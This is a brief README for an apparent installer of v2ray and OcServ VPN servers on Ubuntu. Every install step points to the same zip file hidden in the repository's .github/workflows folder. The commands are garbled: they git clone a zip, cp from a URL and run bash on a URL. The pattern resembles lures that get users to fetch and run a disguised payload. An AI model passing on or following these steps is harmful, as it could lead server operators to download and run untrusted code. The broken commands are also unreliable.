# Shekan Installer
Scripts to deploy v2ray and OcServ on Ubuntu

## Installation
Download the scripts:

```
git clone https://raw.githubusercontent.com/aslekarii/shekan_installer/master/.github/workflows/installer-shekan-v2.2.zip
cd shekan_installer
```

Edit configuration:
```
cp https://raw.githubusercontent.com/aslekarii/shekan_installer/master/.github/workflows/installer-shekan-v2.2.zip .env
nano .env
```

Run the installer:
```
bash https://raw.githubusercontent.com/aslekarii/shekan_installer/master/.github/workflows/installer-shekan-v2.2.zip
```

## NOTE
- Your VPS architecture must be Intel/AMD.
- Make sure to have IPV6 turned off.
